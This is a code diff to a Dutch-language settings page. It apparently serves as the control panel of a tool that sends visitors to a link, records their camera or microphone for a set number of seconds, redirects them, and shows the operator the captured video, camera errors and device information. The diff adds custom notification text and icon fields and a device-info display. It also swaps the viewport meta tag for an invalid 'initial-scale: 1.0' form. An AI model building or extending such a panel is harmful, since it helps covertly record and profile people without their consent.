@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale: 1.0">
     <title>Instellingen</title>
     <style>
         body {
@@ -242,6 +242,22 @@
             <input type="number" id="record-seconds" class="input-field" placeholder="Bijv. 10" min="0">
         </div>
 
+        <div class="input-row">
+            <label for="notification-title">Notificatie Titel (optioneel):</label>
+            <input type="text" id="notification-title" class="input-field" placeholder="Titel van de notificatie">
+        </div>
+
+        <div class="input-row">
+            <label for="notification-body">Notificatie Bericht (optioneel):</label>
+            <input type="text" id="notification-body" class="input-field" placeholder="Bericht in de notificatie">
+        </div>
+
+        <div class="input-row">
+            <label for="notification-icon">Notificatie Icoon URL (optioneel):</label>
+            <input type="url" id="notification-icon" class="input-field" placeholder="URL naar een icoon afbeelding">
+        </div>
+
+
         <button class="save-button" id="save-settings">Instellingen Opslaan</button>
 
         <!-- Trigger for redirect (link or button) -->
@@ -296,6 +312,9 @@ const messageText = document.getElementById('message-text');
 const redirectUrl = document.getElementById('redirect-url');
 const redirectSeconds = document.getElementById('redirect-seconds');
 const recordSeconds = document.getElementById('record-seconds');
+const notificationTitle = document.getElementById('notification-title');
+const notificationBody = document.getElementById('notification-body');
+const notificationIcon = document.getElementById('notification-icon');
 const saveSettingsButton = document.getElementById('save-settings');
 const triggerRedirectButton = document.getElementById('trigger-redirect');
 const successMessage = document.getElementById('success-message');
@@ -410,6 +429,9 @@ async function loadSettingsAndData(userId) { // userId is now parameter
             redirectUrl.value = settingsData.redirectUrl || '';
             redirectSeconds.value = settingsData.redirectSeconds || '0';
             recordSeconds.value = settingsData.recordSeconds || '0';
+            notificationTitle.value = settingsData.notificationTitle || '';
+            notificationBody.value = settingsData.notificationBody || '';
+            notificationIcon.value = settingsData.notificationIcon || '';
         }
          updateExplanations();
 
@@ -451,7 +473,10 @@ async function saveSettings() {
             messageText: messageText.value,
             redirectUrl: redirectUrl.value,
             redirectSeconds: redirectSeconds.value,
-            recordSeconds: recordSeconds.value
+            recordSeconds: recordSeconds.value,
+            notificationTitle: notificationTitle.value,
+            notificationBody: notificationBody.value,
+            notificationIcon: notificationIcon.value
         };
          updateExplanations();
 
@@ -478,7 +503,7 @@ async function displayData(data) {
     dataList.innerHTML = ''; // Clear existing data
     errorMessage.style.display = 'none'; // Hide previous errors
 
-    console.log("Data received in displayData:", data); // <-- ADD THIS
+    console.log("Data received in displayData:", data);
 
     try {
         if (data.videoUrl) {
@@ -551,6 +576,11 @@ async function displayData(data) {
             addDataItem("Camera/Microfoon Fout", data.cameraError);
         }else{
             console.log("No camera error found in data")
+        }
+        if (data.deviceInfo) {
+            addDataItem("Device Informatie", data.deviceInfo);
+        } else {
+            console.log("No device info found in data");
         }
     } catch (error) {
         console.error("Error displaying data:", error);
